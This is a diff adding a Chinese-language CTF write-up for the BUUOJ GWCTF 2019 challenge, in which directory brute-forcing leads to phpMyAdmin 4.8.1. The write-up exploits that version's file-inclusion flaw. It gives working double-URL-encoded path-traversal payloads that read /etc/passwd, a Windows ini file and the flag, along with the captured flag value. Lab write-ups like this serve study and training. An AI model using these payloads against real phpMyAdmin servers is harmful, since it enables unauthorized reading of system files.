@@ -3227,6 +3227,43 @@ Archive:  00000000.zip
 flag{ev3n::y0u::bru7us?!} 
 ```
 
+## BUUOJ [GWCTF 2019]我有一个数据库
+
+> 参考链接：https://blog.csdn.net/qq_45521281/article/details/105780497
+
+### 1. 复现
+
+进来并没有发现什么可用的东西，然后按惯例就需要进一步做目录爆破
+
+<img src="CTF.assets/image-20231123163226294.png" alt="image-20231123163226294" style="zoom: 67%;" />
+
+一般来讲是可以爆破得到`phpmyadmin`目录的，但是由于`buuoj`平台不允许，所以这里只能看了一下wp，发现存在目录`phpmyadmin`
+
+<img src="CTF.assets/image-20231123163415025.png" alt="image-20231123163415025" style="zoom:67%;" />
+
+进来之后查看`phpmyadmin`的版本信息为：` 4.8.1`，搜索了一下这个版本存在文件包含漏洞
+
+**漏洞原因：phpMyadmin 4.8.1版本的index.php中存在文件包含漏洞，通过 二次url编码 即可绕过过滤。**
+
+```
+/* 方法一 */
+http://localhost:8088/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
+
+/* 方法二 */
+http://localhost:8088/phpmyadmin/index.php?target=db_datadict.php%253f/../../../../../../../../../Windows/DATE.ini
+```
+
+以此payload包含：`/flag`即可
+
+```
+http://localhost:8088/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag
+flag{338f8ad6-ae9d-46d0-baea-197cd64dd18b}
+```
+
+![image-20231123163825303](CTF.assets/image-20231123163825303.png)
+
+
+
 # 数字取证
 
 ## 1. 不知道哪里的题目
